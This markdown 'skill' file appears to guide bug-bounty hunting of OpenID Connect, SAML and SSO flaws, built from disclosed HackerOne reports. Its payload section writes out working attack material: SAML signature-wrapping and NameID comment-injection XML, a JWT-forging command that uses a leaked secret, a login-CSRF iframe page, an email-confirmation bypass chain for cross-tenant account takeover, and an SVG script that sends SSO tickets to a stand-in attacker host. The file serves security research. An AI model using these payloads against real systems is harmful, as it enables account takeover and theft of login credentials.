---
name: hunt-openid
description: Hunting skill for OpenID Connect / SSO vulnerabilities, built from 24 full disclosed HackerOne reports (28-report assigned corpus). Covers the patterns that actually paid in the corpus: email-confirmation bypass on multi-tenant subdomains cascading into SSO account takeover (Shopify #791775/#796956 Critical), improper SAML signature verification and first-element selection XSW/auth bypass (Rocket.Chat #812064/#1049375, New Relic #168108, Uber #223014), client-side JWT SSO secret leakage in JS bundles and source maps (Trint/Zendesk #638635, #734936), SAML response replay (HackerOne #888930), disabled-feature controllers still reachable (Nextcloud user_oidc ID4me #2376929), SSO domain-enforcement bypass via trailing control chars (#2101076), SSO-SAML open redirect bypass (#171398/#178345/#241484), SVG upload + JS execution stealing SSO login tickets (Snapchat #265943), OAuth error-fallback reflected XSS (ORY Hydra/Zomato #456333), and SSO DoS/cross-org login confusion (Superhuman #976603). Use when hunting OIDC/SAML/SSO flows, social login, multi-tenant identity, or any `.well-known/openid-configuration` surface.
sources: hackerone_public, cve_database, github
report_count: 28
full_reports_read: 24
---

## Crown Jewel Targets

OpenID Connect and SSO bugs are high-value because the authentication decision *is* the product: a single flaw collapses the identity boundary and yields account takeover (ATO), cross-tenant access, or internal-system access. In the 24 full reports, the money followed identity systems that were **shared across many users or many tenants** — one bug hit every account on the platform. A broken SAML check or a mis-bound email does not affect one user; it affects everyone who relies on that identity path.

Highest-value targets evidenced in the corpus:

- **Multi-tenant SaaS whose accounts are keyed on email and offer SSO "integration"/account-linking.** Shopify's `*.myshopify.com` let an attacker confirm an arbitrary email, then "integrate" with any other store sharing that email, escalating to **any shop owner** (#791775 Critical, #796956). Any platform where "same email = same identity" is a crown jewel.

- **SAML Assertion Consumer Service (ACS) and SSO finalize endpoints.** `/users/saml/auth` (HackerOne #888930), `/accounts/$account_id/sso/saml/finalize` (New Relic #168108), and generic `/sso` POST endpoints (Informatica #106865) — improper signature verification here is a direct auth bypass. The SP's decision to create a session is made at exactly these routes.

- **Self-service SAML/OIDC provider configuration.** Rocket.Chat's unauthenticated `addSamlProvider` Meteor method could disable signature verification outright (#1049375, CVSS 10.0). Any user-controllable IdP registration/config surface is critical — especially one where "no certificate configured" silently means "skip verification."

- **Client-side SSO token generation.** Trint generated the Zendesk JWT in a browser JS bundle with the signing secret embedded (`REACT_APP_ZENDESK_SECRET`, exposed via `app.js.map`) — anyone could mint a token for any user (#638635). Grep every bundle and source map for `jwt.sign`, `secret`, and SSO redirect builders.

- **OIDC features that are "disabled" but whose controllers remain routable.** Nextcloud `user_oidc` ID4me at `/apps/user_oidc/id4me` allowed unauthenticated account registration even when the UI toggle was off, chaining into instance-wide Talk chat rooms (#2376929). A toggle that only hides a button is not a control.

- **Signup flows with SSO domain enforcement.** HackerOne blocked registration on SAML-enforced email domains but `%0d%0a` trailing control chars bypassed it → unauthorized access to the PullRequest org (#2101076). Any "this domain must use SSO" check is a bypass target.

- **OAuth/OIDC error and callback pages.** Reflected XSS at `/oauth2/fallbacks/error` on an ORY Hydra provider (`auth2.zomato.com`) stole cookies of logged-in users (#456333). Token/carryover flows that land on error pages are rich because the error params are reflected and the victim is authenticated.

- **IdP-issued login tickets carried in URLs.** Snapchat's `sso_continue?ticket=` was capturable via an SVG upload with JS execution on Google Cloud Storage (#265943, $7,500). Anything that puts a reusable SSO credential in a URL is stealable by any script on that origin.

- **Internal/staging SSO gateways and their static assets.** Uber's `uchat-staging.uberinternal.com` served source/config without OneLogin SSO (#298990); Airbnb's SSO gateway leaked valid logins via search indexing (#161659); HackerOne private SAML programs were fingerprintable (#167828). The trust boundary between staging and prod is frequently the weak point.

Typical payouts in this corpus: **Critical (CVSS 10.0)** for unauthenticated SAML-verification disable, **High** for email-confirmation → shop-owner takeover, **$10,500** for SSO DoS + cross-org login abuse, **$8,500** for SAML verification bypass to internal chats, **$7,500** for SSO token theft, and **CVSS 8.1** for client-side JWT secret disclosure. Severity tracks how many identities the flaw crosses, not the technical complexity of the trick.

---

## Attack Surface Signals

### URL / Endpoint Patterns to Hunt
```
/users/saml/sign_in?email=...          # HackerOne SSO-SAML login start (#171398, #178345)
/users/saml/auth                       # SAML ACS where response is POSTed (#888930)
/saml/acs, /sso/saml/, /auth/saml/callback
/sso                                   # generic SAML POST (Informatica #106865)
/accounts/$id/sso/saml/finalize        # New Relic SAML finalize (#168108)
/.well-known/openid-configuration      # OIDC discovery (Nextcloud #2376929)
/apps/user_oidc/id4me                  # "disabled" OIDC controller still reachable (#2376929)
/oauth2/fallbacks/error?error=...      # ORY Hydra error page XSS (#456333)
/accounts/login?client_id=...&referrer=...
/accounts/sso?client_id=...&referrer=...
/sso_continue?ticket=...               # SSO login ticket in URL (#265943)
POST /users                            # signup with domain enforcement (#2101076)
/access/jwt?jwt=<TOKEN>                # Zendesk JWT SSO landing (#638635)
graphql2.<host>  query zendeskToken    # GraphQL exposing SSO token (#734936)
*.myshopify.com                        # multi-tenant subdomain identity (#791775)
/openid/... (e.g. openid.mail.ru/login)# OpenID login open redirect (#241484)
```

### Parameter / Body Signals
```
email=            referrer=          state=            redirect_uri=
client_id=        ticket=            jwt=              response_type=
user[email]=      redirect_path=     SAMLResponse=     remember_me=
zendeskToken      REACT_APP_*_SECRET  id4me             sso
```

The parameter that matters most is `email` — in this corpus it is the join key between accounts, tenants, and SSO identities (#791775, #796956, #2101076, #734936). Second is whatever carries the credential: `ticket`, `jwt`, `SAMLResponse`, `zendeskToken`. Third is the redirect surface: `referrer`, `redirect_path`, `redirect_uri`, `remember_me`.

### Response / Header Signals
```
Location: .../access/jwt?jwt=<JWT>
Location: .../sso_continue?ticket=<TOKEN>
Set-Cookie: oauth_state / session cookie set after SAML POST
Referer: https://<idp>/app/template_saml/.../sso/saml   (Okta SAML flow, #106865)
Location: {"redirect_path":"/users/saml/sign_in?email=..."}  (#2101076)
```

A `Referer` pointing at an IdP SAML template is a free stack fingerprint — it tells you exactly which SSO product and flow to target (Informatica #106865). A JSON body returning `redirect_path` on signup is the tell for SSO domain enforcement (#2101076).

### JS / Source-Review Signals (grep in bundles & source maps)
```
jwt.sign(          REACT_APP_ZENDESK_SECRET   ZENDESK_DOMAIN
window.location = `${ZENDESK_DOMAIN}/access/jwt?jwt=`
generateZendeskTokenAndRedirect
redirect_uri       client_secret       oauth_token      access_token
<file>.js.map      process.env.<SECRET>
```

Always fetch the `.js.map` alongside the bundle. Source maps restore variable names and original source, which is how the Trint secret and the `generateZendeskTokenAndRedirect` function were found (#638635).

### Multi-Tenant & Identity-Binding Signals
```
*.target.com/<tenant>          # tenant subdomain — is identity shared by email?
support+1@<org>.com            # plus-addressing to claim an org identity (#734936)
user[email]=victim@target.com%0d%0a   # SSO domain enforcement bypass (#2101076)
redirect_path=/users/saml/sign_in?email=...  # signup forced into SSO (#2101076)
"integrate" / "merge accounts" / "link account"  # Shopify SSO linking (#791775, #796956)
"invite" acceptance as email proof (#2037902)
```

Watch for product language: "integrate," "merge," "link," "single login," "same email" are the UI words for an identity-binding decision. In the Shopify reports the entire escalation hinged on the "integrate with other Shopify store that shares the same email address" feature (#791775), and the follow-up showed the merge flow still demanded the merchant's master password — which is exactly the kind of secondary control you must test, not assume (#796956).

For multi-tenant targets, build a two-account matrix: attacker tenant + victim tenant sharing one email. Then test every feature that reads or writes `email`: signup, confirmation, profile change, SSO integration, invitation, and password reset. The corpus shows the decisive bug is usually in one of these transitions rather than in the SSO protocol itself.

### Tech-Stack Signals
- **SAML libraries with known parser permutations:** `meteor-accounts-saml`, `php-saml`/`xmlseclibs`, ORY Hydra, OneLogin/php-saml ≤ 2.10.4 (#213789).

- **Multi-tenant subdomain platforms** (`*.myshopify.com`) = email-keyed identity surface.

- **Okta / OneLogin / Google SSO fronting internal apps** — look for the IdP in `Referer` and staging subdomains that skip SSO.

- **Nextcloud `user_oidc` / ID4me**, **JetPack SSO WordPress manager** (#2037902), **Zendesk JWT SSO**.

- **GraphQL endpoints returning SSO tokens** (`zendeskToken`, #734936).

- **Cloud object storage accepting SVG uploads** tied to a web app (#265943).

---

## Discovery Patterns From 24 Full Reports

### Where Researchers Start (ranked recon surfaces w/ "what to look for")

Ranked by how often the surface produced a finding in the 24 full reports. The ranking is the frequency table from the study pack, reinterpreted as a recon order.

1. **Map the SSO entry points and their parameters first (`sso-oauth`: 24/24 reports).** What to look for: every sign-in, callback, ACS, authorize, and finalize route. The corpus is overwhelmingly SSO/OAuth — start at login, not at business features. Capture `client_id`, `referrer`, `email`, `state`, `ticket`, `redirect_uri` on every hop. The Snapchat chain (#265943) was reconstructed from three explicit hops: `login?client_id=creativesuite-prod&referrer=.../sso_continue` → `/accounts/sso` → `/sso_continue?ticket=`. If you do not map the flow, you will not see where the credential travels.

2. **Signup / email-confirmation flows on multi-tenant subdomains (`filter-bypass`: 10/24).** What to look for: can you change your email *after* signup, before confirming the original? Shopify sent the confirmation link for the new email to the *old* signup email, enabling confirmation of arbitrary addresses → SSO integration into any store with that email (#791775). Also test trailing control chars on `user[email]` against SSO domain enforcement (#2101076) and invitation flows that skip email verification (#2037902).

3. **Redirect / referrer handling on login endpoints (`redirect-handling`: 10/24).** What to look for: does the SSO login URL auto-start via GET and then redirect externally? HackerOne's `/users/saml/sign_in?email=` was auto-startable and open-redirectable (#171398), and the patch was bypassed with a doubled slash `users//saml/sign_in` (#178345). Test `referrer`, `redirect_path`, and `redirect_uri` on every SSO hop, not just the final callback.

4. **Search / index / enumeration surfaces (`search-filter-sort`: 6/24).** What to look for: internal SSO gateways indexed by search engines (Airbnb `https://<gateway>/people/alice_brown` leaked valid logins, #161659), directory-style user enumeration, and "strong indicators" of private SAML programs (#167828). Missing `robots.txt` on an internal SSO gateway is a real finding here.

5. **Open redirects anywhere on the target (`open-redirect`: 6/24).** What to look for: standalone open redirects on `openid.mail.ru/login` (#241484) and on SSO-SAML sign-in — then chain them into a token/code leak. An open redirect alone may be out of scope (#241484 was closed as out-of-scope), so always find the impact: where does a credential ride on that redirect?

6. **XML / SAML parsing (`xml-parser`: 5/24) and auth bypass (`auth-bypass`: 4/24).** What to look for: which `Signature` and `Response` element does the SP actually use? Rocket.Chat used `//*[local-name(.)='Signature'...][0]` and `getElementsByTagNameNS(...'Response')[0]` — first element wins → inject/modify assertions (#812064). Test unsigned responses to finalize endpoints (#168108, #223014) and comment injection in `NameID`.

7. **Admin / internal configuration surfaces (`admin-internal`: 5/24).** What to look for: unauthenticated config methods (`addSamlProvider`, #1049375), disabled-feature controllers still routable (#2376929), staging subdomains serving config without SSO (#298990). Enumerate RPC/method names in JS bundles, not just HTTP paths.

8. **Session handling (`session-attack`: 5/24).** What to look for: replay of a captured SAML response to `/users/saml/auth` (#888930), SSO login CSRF via iframe + delayed redirect (#171398), cross-organization SSO assignment (#976603). Ask: can a valid auth artifact be used a second time, or by a different browser?

9. **Subdomain trust / takeover (`subdomain-takeover`: 4/24).** What to look for: `*.myshopify.com` email-keyed integration (#791775), `uchat` vs `uchat-staging` trust boundaries (#298990, #223014), dangling SSO-bound subdomains. Map which subdomains are inside the SSO trust boundary and which are reachable without it.

10. **JS bundles and source maps (`js-source-review`: 4/24).** What to look for: fetch `app.js` and `app.js.map`, grep for `jwt.sign`, `REACT_APP_*_SECRET`, SSO redirect builders. Trint's client-side JWT secret was sitting in a public sourcemap (#638635). Review the source, not just the rendered form.

### Feature-Based Discovery Signals (frequency-ranked table w/ "why it matters / what to probe")

Counts are the number of the 24 full reports whose mined technique tags contain the signal (frequency table, study pack §1). A report can carry several tags.

| Rank | Feature signal | /24 | Why it matters | What to probe |
|---|---|---|---|---|
| 1 | `sso-oauth` | 24 | Universally present — SSO/OAuth is the attack surface itself | Enumerate every login, authorize, callback, ACS, finalize route; capture all flow params |
| 2 | `filter-bypass` | 10 | Validation filters are the control being defeated | Change email post-signup; `%0d%0a` on `user[email]`; doubled slash in path; control chars |
| 3 | `redirect-handling` | 10 | Tokens/tickets ride on redirects | Auto-start GET login → external Location; `referrer=`, `redirect_path=`; chain open redirect |
| 4 | `search-filter-sort` | 6 | Internal SSO data leaks via indexing/enumeration | Google `site:` on gateway `/people/<user>`; directory-style login-name enumeration |
| 5 | `open-redirect` | 6 | Redirect on an identity host becomes token theft when chained | `openid.<host>/login?...`; SSO-SAML sign-in external redirect; find the credential hop |
| 6 | `xml-parser` | 5 | Parser inconsistency = assertion injection | Which Signature/Response element is `[0]`; unsigned response to finalize; NameID comments |
| 7 | `admin-internal` | 5 | Config surfaces can disable verification or expose internal data | Unauthenticated config methods/disabled controllers; staging subdomain static assets |
| 8 | `session-attack` | 5 | SSO session establishment is replayable/forgeable | Replay captured SAML response; login CSRF iframe; cross-org session assignment |
| 9 | `subdomain-takeover` | 4 | Email/subdomain trust crosses tenant boundaries | `*.myshopify.com` email integration; staging vs prod SSO trust |
| 10 | `api-endpoint` | 4 | GraphQL/API returns SSO tokens directly | Query `zendeskToken` on `graphql2.<host>` (#734936); CORS misconfig on token APIs |
| 11 | `comment-injection` | 4 | XML comment nodes split parser identity vs signed identity | `<NameID>admin@host<!--x-->@evil</NameID>` style payloads against SAML parsers |
| 12 | `js-source-review` | 4 | Client-side SSO exposes secrets and logic | Fetch `.js` + `.js.map`; grep `jwt.sign`, `REACT_APP_*SECRET` |
| 13 | `auth-bypass` | 4 | The core payoff | Unverified SAML response accepted; email verification skippable via invite |
| 14 | `jwt-token` / `cookie-handling` | 3 each | Forgeable tokens / stolen cookies | Inspect JWT signing location; cookie theft via XSS on OAuth error page |
| 15 | `csrf` | 3 | Login CSRF hijacks victim session | Iframe auto-login + delayed navigation (#171398); cleartext IdP enables login CSRF (#703759) |

Lower-frequency but still real signals in the pack: `image-processing`/`svg-upload`/`import-feature`/`url-fetching` (3/2/2/2 — the Snapchat SVG chain #265943), `export-feature`/`template-injection`/`stored`/`proxy-feature` (3/2/2/2), `boolean-based` (2 — php-saml `-1`→`true` #213789), `misconfiguration` (2 — #298990, #1049375), and single-report signals `dos-resource` (#976603), `file-upload`/`svg-upload` (#265943), `reflected`/`cookie-handling` (#456333), `self-xss` (#171398), `stack-fingerprinting`/`graphql`/`json-body`/`cors-misconfig` (#734936), `public-code-search`/`boolean-based` (#213789), `unicode-normalization` (#2101076), and `api-endpoint` (#2376929). Rare tags still map to real, paid bugs — do not filter them out of scope.

**Cross-report correlation — how the tags combine into chains.** No report in the corpus is a single-tag event; the paid findings are combinations. Reading the frequency table as a chain graph:

- `sso-oauth` + `filter-bypass` + `subdomain-takeover` = the Shopify email-confirmation → SSO integration → cross-tenant ATO (#791775, #796956). The identity surface plus a validation bypass plus a trust boundary.
- `sso-oauth` + `xml-parser` + `comment-injection` + `auth-bypass` = the SAML assertion-injection family (#812064, #106865, #168108, #223014, #213789).
- `sso-oauth` + `js-source-review` + `jwt-token` + `admin-internal` = the client-side JWT secret family (#638635, #734936).
- `sso-oauth` + `redirect-handling` + `open-redirect` + `csrf` + `session-attack` = the login-CSRF/open-redirect family (#171398, #178345, #241484, #703759).
- `sso-oauth` + `file-upload`/`svg-upload`/`url-fetching`/`image-processing` + `api-endpoint` = the Snapchat SSO-ticket theft chain (#265943).
- `sso-oauth` + `search-filter-sort` + `server-side-rendering` = the internal SSO gateway information leak (#161659, #167828).

Operational takeaway: when you confirm one tag on a target, immediately test the adjacent tags in the same row. A `filter-bypass` on an SSO signup route is not complete until you have walked it to the `session-attack` payoff.

### Verbatim Discovery Clues

All real `[#id]`-attributed verbatim lines available in the study pack (the seven explicit "how I found it" clues from §3 plus the highest-value verbatim excerpts from §2/§4). Quoted exactly; truncation markers (`…`, `*`) and redactions (`█`) are preserved from the pack. These are the researchers' own words about how they found each issue.

- **[#791775]** "I found a way to confirm arbitrary emails, and after confirming arbitrary email in *."

- **[#791775]** "It's possible to take over any store account through bypassing the email confirmation step in *.myshopify.com. I found a way to confirm arbitrary emails, and after confirming arbitrary email in *.myshopify.com, user is able to integrate with other Shopify store that shares the same email address"

- **[#791775]** "The bug is that Shopify email system mistakenly send the confirmation link of the new email address, to the one that is used to signed up."

- **[#796956]** "What happened in #791775 was, I was too excited and didn't take a step further to try to takeover merchant's account even they have SSO setup, and after reading the comment `An important mitigating factor was that this bug only affected user accounts which"

- **[#796956]** "For merchant that have accounts already setup SSO, even attacker has bypassed the email confirmation, they would have no ways to takeover the rest of the accounts of the merchant, because they will need to enter the master password of the merchant in the process of merging accounts."

- **[#976603]** "There's an interesting issue I've spent quite a few days trying to escalate but can't figure out. The impact at this point is that I can DOS any SSO integration making it so nobody in that organization can login. I can also get users to inadvertently SSO into my attacker organization"

- **[#976603]** "The strange behavior and why I think it *might* be possible to escalate further, is that I can have you authenticate against one SSO instance, but have you get added to a completely separate one."

- **[#265943]** "com`, I was able to upload a `svg` image to google cloud storage, using which I run my javascript code."

- **[#265943]** "1] I observed you are using Google Cloud Storage, so blocking `svg` images or disallowing any uploads of `svg-xss` images will further enhance security."

- **[#265943]** "Attacker can steal SSO login tokens for snappublisher.snapchat.com by chaining different flaws in SSO and Snapchat's Snappublisher tool."

- **[#265943]** "So, a SSO login token `ticket` is sent from `accounts.snapchat.com` to `snappublisher.snapchat.com` which is used to login the user. And is also used in `Authorization header` when making requests to API."

- **[#638635]** "app.trint.com implements SSO to Zendesk, it does this by using JWT as described at https://support.zendesk.com/hc/en-us/articles/203663816-Enabling-JWT-JSON-Web-Token-single-sign-on"

- **[#638635]** "const { REACT_APP_ZENDESK_SECRET } = process.env;" and "const zendeskToken = jwt.sign(payload, REACT_APP_ZENDESK_SECRET);"

- **[#171398]** "An attacker can use Logout CSRF + Login CSRF against a victim to steal all information sent by the victim to the HackerOne website while using the malicious session, including confidential bug reports."

- **[#171398]** "Since the SSO-SAML login flow can be started automatically (`GET https://hackerone.com/users/saml/sign_in?email=███`) by an attacker and it redirects to external URLs, the attacker can redirect the user to anywhere."

- **[#888930]** "When logging in with SAML, the user's IDP authenticates the user and generates a SAML response. The IDP then redirects the user's browser back to HackerOne to submit the SAML response."

- **[#178345]** "I found a bypass of that patch." — with endpoint `https://hackerone.com/users//saml/sign_in?email=teste@snapchat.com&remember_me=true` bypassing the External Link Warning page.

- **[#734936]** "hello there because in `app.trint.com` there's no email verification i able to login in your `zendesk SSO` using your organization ... `support+1@trint.com` and i able to login in zendesk SSO using that email."

- **[#812064]** "When using SAML authentication, responses are not checked properly. This allows attacker to inject/modify any assertions in the SAML response and thus, for example, authenticate as administrator."

- **[#812064]** "When checking the signature, the first Signature element which is found in the whole response XML is used"

- **[#1049375]** "Rocket.Chat exposes an unauthenticated Meteor method `addSamlProvider`, which allows disabling SAML signature verification."

- **[#1049375]** "The provider `name` is entirely user-controlled in this case."

- **[#2376929]** "It is possible to register a new account on any Nextcloud server that has user_oidc enabled by just opening `/apps/user_oidc/id4me` as unauthenticated user."

- **[#2376929]** "This is caused since the setting to enable/disable ID4ME has no effect at all except hiding the button on the login site. The controllers are however still accessible."

- **[#2101076]** "- The accounts created while testing were `j@hackerone." — and "SAML signup domain enforcement for new signups that belong to a SAML-enabled organization can be bypassed with trailing control characters."

- **[#2101076]** "However, adding a `%0d%0a` in the end of the email param will make the request go through"

- **[#167828]** "@ayoubfathi found a strong indicator of the existence of some private programs which were using SAML."

- **[#168108]** "It is possible to POST a custom SAML response to https://rpm.newrelic.com/accounts/$account_id/sso/saml/finalize and bypass authentication."

- **[#223014]** "Due to improper SAML verification it was possible to bypass the OneLogin authentication on https://uchat.uberinternal.com and gain unauthorized access to internal chats."

- **[#2037902]** "The user anyways when he tries to authenticate into his wordpress instance via wordpress.com he gotta have his email confirmed, otherwise it won't work, interstingly there is a way that bypasses the email confirmation when a user invites you to his account and you accept his invite"

- **[#456333]** "**Vulnerable Parameters:** All available parameters are vulnerable" — "An attacker can send this url with payload to an already login user and can steal the cookie."

- **[#298990]** "Configuration file and/or source code information leakage without authentication." — reproduced at `https://uchat-staging.uberinternal.com/static/main.740f5a0b92c00e72e2e1.js`

- **[#703759]** "When using single-sign on through odnoklassniki, the user is sent to an http (non-https) URL, allowing an attacker (under some conditions) to log in to the victim's Badoo account by stealing odnoklassniki credentials"

- **[#161659]** "There is an Information leakage type weakness present on ███████ which supposedly works as a Single Sign On (SSO) gateway for Airbnb's corporate services."

- **[#213789]** "The php-saml library as used by our SSO implementation had a minor security patch in 2.10.4" — signature validation where `openssl_verify()` returning `-1` converts to `true` in PHP boolean context.

- **[#106865]** "POST /sso HTTP/1.1" / "Host: rev-app.informatica.com" / "Referer: https://infapassport.okta.com/app/template_saml/kwtbgh4jLAZPMXLQUNMU/sso/saml" — the Okta SAML POST that exposed the stack.

- **[#734936]** "i registered in `app.trint.com` using this email `support+1@trint.com` until registration step finish" / "i check my burp history there's a `graphql` request in this host `https://graphql2.trint.com/`"

- **[#2101076]** "The request to `/POST users` returns a redirect to the SSO provider" with body `{"redirect_path":"/users/saml/sign_in?email=email%40example.com"}`.

- **[#812064]** "After the XML signature has been verified, the code proceeds to use the first Response element found in the whole XML to get assertions and attributes."

- **[#1049375]** "if a SAML authentication provider does not have a certificate set, or the setting is falsy, no validation is performed"

- **[#2376929]** "1. Open http://localhost:8080/apps/user_oidc/id4me" — the full exploit was a direct GET to a controller the UI claimed was disabled.

- **[#298990]** "Access to internal configuration files, system names, and source code." — the stated impact of serving static assets without OneLogin SSO.

### Probe Checklist (15 concrete probes)

1. Sign up on `*.target.com` subdomain, change email to victim's before confirming — does the confirmation link go to the *original* email? (#791775)

2. Append `%0d%0a` / trailing control chars to `user[email]` on `POST /users` against an SSO-enforced domain (#2101076).

3. Accept an invitation on an unverified email — does it bypass email confirmation and grant admin-panel access? (#2037902)

4. Register `support+1@<org>.com` on an app with no email verification, then attempt SSO login to the org's support/Zendesk instance (#734936).

5. Send an unsigned / attacker-built SAML response to the SSO finalize endpoint with a known account ID + email (#168108, #223014).

6. Duplicate the `Assertion`/`Response`/`Signature` elements and check which one the SP processes (first-element XSW) (#812064).

7. Replay a captured `SAMLResponse` to `/users/saml/auth` in a fresh session — is the same response accepted twice? (#888930)

8. Call unauthenticated SSO config methods / register a new SAML provider to see if signature verification can be disabled (#1049375).

9. Fetch `app.js` and `app.js.map`; grep for `jwt.sign`, `REACT_APP_*_SECRET`, `/access/jwt?jwt=`; try minting a token for another user (#638635).

10. Request `/apps/user_oidc/id4me` (or any "disabled" OIDC/off-feature controller) unauthenticated while the UI toggle is off (#2376929).

11. Start SSO login via GET and inject an external `referrer=` / `redirect_path=` — observe the `Location` header (#171398); then retest bypasses like doubled slashes `users//saml` (#178345).

12. Test `openid.<target>/login` style endpoints for open redirects, then chain into the credential-carrying hop (#241484).

13. Upload an SVG with JS to any cloud-storage-backed feature and see if it executes on the storage origin and can read `?ticket=` / `#hashfragment` (#265943).

14. Probe the OAuth error fallback (`/oauth2/fallbacks/error?error=&error_description=&error_hint=`) for reflected XSS on logged-in users (#456333).

15. Check staging/internal SSO subdomains and search-engine indexing for source/config files and valid login names served without SSO (#298990, #161659).

---

## Step-by-Step Hunting Methodology

1. **Inventory the identity surface.** For every target, first spider `/login`, `/signin`, `/auth`, `/sso`, `/saml`, `/oauth`, `/connect`, `/.well-known/openid-configuration`, and any `POST /users`/signup route. In the corpus, 24/24 reports involved an SSO/OAuth flow, so login is always step one. Record which routes are GET (auto-startable) and which are POST (ACS/finalize).

2. **Reconstruct the full SSO flow hop-by-hop.** Capture each request from login initiation → IdP → callback/ACS → session issuance. Note every parameter (`client_id`, `referrer`, `email`, `state`, `ticket`, `redirect_uri`, `SAMLResponse`). The Snapchat chain (#265943) only became clear after mapping all three hops and spotting the `ticket` flowing through the URL and into an `Authorization` header.

3. **Test the email → identity binding.** On multi-tenant apps, try post-signup email change, arbitrary-email confirmation, unverified-email SSO login, invitation bypass, and trailing-control-char domain enforcement bypass (#791775, #796956, #2037902, #734936, #2101076). This is the highest-severity cluster in the corpus. Ask: can I make the system believe I control someone else's email?

4. **Attack SAML verification.** Decode the `SAMLResponse` (`base64 -d`), identify which `Signature`/`Response` element the SP uses, and test: unsigned response, first-element XSW, comment injection in `NameID`, and replay of a captured response (#812064, #168108, #223014, #888930, #1049375). Use SAML Raider to automate the element permutations.

5. **Hunt client-side token generation.** Pull JS bundles and source maps; grep for `jwt.sign`, `secret`, `generate*Token`, `/access/jwt?jwt=`. If the SSO token is signed client-side, the secret is public — forge a token for an admin (#638635). Also check GraphQL/API fields that return tokens directly (#734936).

6. **Probe "disabled" and internal surfaces.** Request OIDC/off-feature controllers directly (#2376929), look for unauthenticated config RPCs (#1049375), and check staging/internal subdomains for assets served without SSO (#298990). Enumerate method/function names from JS, not just URL paths.

7. **Test redirects and CSRF on login.** Auto-start SSO via GET, inject external redirects, test doubled-slash and path tricks against the patch (#171398, #178345, #241484, #703759). Build the iframe + delayed-navigation login-CSRF PoC where relevant (#171398). Check whether the IdP handoff is over `http://` (#703759).

8. **Look for secondary leakage that feeds SSO theft.** SVG/upload JS execution on a storage origin (#265943), GraphQL token queries (#734936), OAuth error-page XSS (#456333), and search indexing of internal SSO gateways (#161659). These are the primitives that turn a flow flaw into credential theft.

9. **Escalate deliberately.** Cross-tenant: arbitrary email confirm → SSO integrate → victim store/org (#791775). Internal: SAML bypass → internal chats/tickets (#223014, #734936). Session: replay → silent login as another user (#888930). Availability/identity confusion: SSO DoS + cross-org assignment (#976603).

10. **Run Gate 0 and document the full chain** with screenshots of each hop before reporting. State the auth-decision-changing step explicitly (which identity/role changed as a result), and note prerequisites such as needing an account ID + email (#168108) or an SSO-enabled tenant (#976603).

---

## Payload & Detection Patterns

### Email / Signup Identity-Binding Payloads
```
# Post-signup email change → confirmation misrouting (#791775)
1. signup with attacker@evil.com
2. change email to victim@target.com BEFORE confirming original
3. observe which inbox receives the confirmation link  (bug: original signup inbox)
4. confirm → "integrate" SSO with any store/org sharing victim@target.com

# SSO domain-enforcement bypass (#2101076)
POST /users
user%5Bemail%5D=victim%40target.com%0d%0a     # trailing CRLF defeats suffix check
→ {"redirect_path":"/users/saml/sign_in?email=..."}  # blocked path now bypassed

# Unverified email → org SSO (#734936)
register: support+1@trint.com  (no verification)
POST https://graphql2.trint.com/  {"query":"query zendeskToken { zendeskToken }"}
→ use returned JWT to log into support.zendesk.com as org member

# Invitation as proof-of-email (#2037902)
register unverified account → accept invite from org owner → admin panel access
```

The Shopify escalation (#791775) is worth writing out as an explicit flow, because each step looks harmless in isolation:

```
# Full cross-tenant ATO chain (#791775 / #796956)
attacker: signup trial store  attacker.myshopify.com  email = attacker@evil.tld
attacker: change account email to  victim@victim-store.tld   (do NOT confirm yet)
server:   sends confirmation link for the NEW email to the OLD signup inbox
attacker: follow link → arbitrary email now "confirmed"
attacker: use SSO "integrate with another store" on email victim@victim-store.tld
result:   attacker controls victim store  (full privilege escalation to shop owner)
# Follow-up: for merchants who already enabled SSO, a master-password step exists
# in the merge flow — test whether it can be skipped or satisfied (#796956).
```

### SAML Auth-Bypass / XSW Payloads
```
# First-element selection XSW (#812064) — SP uses Signature[0] and Response[0]
<saml:Response>
  <saml:Assertion ID="evil">
    <saml:Subject><saml:NameID>admin@target.com</saml:NameID></saml:Subject>
  </saml:Assertion>
  <saml:Assertion ID="legit">
    <saml:Subject><saml:NameID>user@target.com</saml:NameID></saml:Subject>
    <ds:Signature><!-- valid signature over #legit --></ds:Signature>
  </saml:Assertion>
</saml:Response>

# Unsigned response to finalize endpoint (#168108, #223014)
POST /accounts/$id/sso/saml/finalize  SAMLResponse=<base64 of attacker-built unsigned response>
Requirements from report: an account ID (SSO-enabled) + a user email.

# Comment injection in NameID (parser vs C14N disagreement)
<NameID>admin@target.com<!---->@evil.com</NameID>

# Replay (#888930)
1. capture SAMLResponse POST to /users/saml/auth
2. replay same base64 blob in a fresh session / new browser
3. if accepted → no InResponseTo / one-time-use enforcement

# Unauthenticated verification-disable (#1049375)
call Meteor method addSamlProvider with attacker-controlled `name`
→ settings.add(`SAML_Custom_${name}`, false)
→ no cert → verifySignatures(response, assertionData, xml) returns early

# Boolean truthiness flaw in php-saml/xmlseclibs (#213789)
# openssl_verify() returns -1 on error; PHP casts non-zero to true
# → crafted LogoutRequest/LogoutResponse passes "verification"
```

### Client-Side JWT Forgery (#638635)
```
# Recon
curl -s https://app.target.com/static/js/app.<hash>.js    -o app.js
curl -s https://app.target.com/static/js/app.<hash>.js.map -o app.js.map
grep -E "jwt.sign|REACT_APP_.*SECRET|access/jwt|ZENDESK_DOMAIN" app.js app.js.map

# If secret is present, mint:
node -e "const jwt=require('jsonwebtoken'); console.log(jwt.sign({name:'admin',email:'victim@target.com'},'<LEAKED_SECRET>'))"

# Land:
https://support.zendesk.com/access/jwt?jwt=<FORGED_JWT>
```

### Login CSRF / Redirect Payloads
```
# Login CSRF via iframe + delayed navigation (#171398)
<html><body>
<iframe id="f" src="LOGOUT_OR_LOGIN_URL" style="width:0;height:0;border:0"></iframe>
<script>setTimeout(function(){
  document.location.href="https://target.com/users/saml/sign_in?email=victim@target.com&remember_me=true";
},5000);</script>
</body></html>

# Auto-startable SSO open redirect + patch bypass (#178345)
https://target.com/users/saml/sign_in?email=x@y.com&remember_me=true
https://target.com/users//saml/sign_in?email=x@y.com&remember_me=true   # doubled slash
→ compare: does second skip the External Link Warning page?

# Cleartext IdP redirect enabling credential theft + login CSRF (#703759)
https://target.com/ok/authorize.phtml?... redirect → http://www.idp.tld/oauth/authorize?... (http!)
```

### SVG / Ticket-Theft Payload (#265943)
```
<!-- hosted at attacker-controlled cloud storage origin, imported via "import from site" -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    // runs on the storage origin that also handles /sso_continue?ticket=
    new Image().src = 'https://attacker/c?ticket=' +
                      encodeURIComponent(location.hash || location.search);
  </script>
</svg>
# Chain: import SVG → JS executes → reads SSO ticket from URL → exfil → replay ticket
```

